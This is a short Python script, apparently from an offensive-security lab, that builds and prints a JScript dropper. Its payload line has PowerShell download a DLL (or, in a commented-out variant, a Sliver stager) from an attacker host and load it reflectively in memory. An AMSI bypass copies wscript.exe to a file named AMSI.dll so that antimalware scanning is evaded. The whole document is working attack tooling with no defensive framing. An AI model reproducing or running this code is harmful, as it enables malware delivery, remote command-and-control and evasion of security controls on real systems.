# PAYLOAD = """powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/win_msf_sliver_stager.exe')\\";$assem = [System.Reflection.Assembly]::Load($data);[SliverStager.Stager]::Main()"""

# DLL Runner
PAYLOAD = """cmd.exe /c powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/DLL-Runner-x64.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('LeMans.Class1');$method = $class.GetMethod('ferrari');$method.Invoke(0, $null)\\" """

JS_AMSIBYPASS = r"""
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
 if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
 {
 throw new Error(1, '');
 }
}
catch(e)
{
 filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
 sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName);
 WScript.Quit(1);
}
"""

JS_EXEC = f"""
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("{PAYLOAD}");
"""

TEMPLATE = JS_AMSIBYPASS + JS_EXEC

print(TEMPLATE)
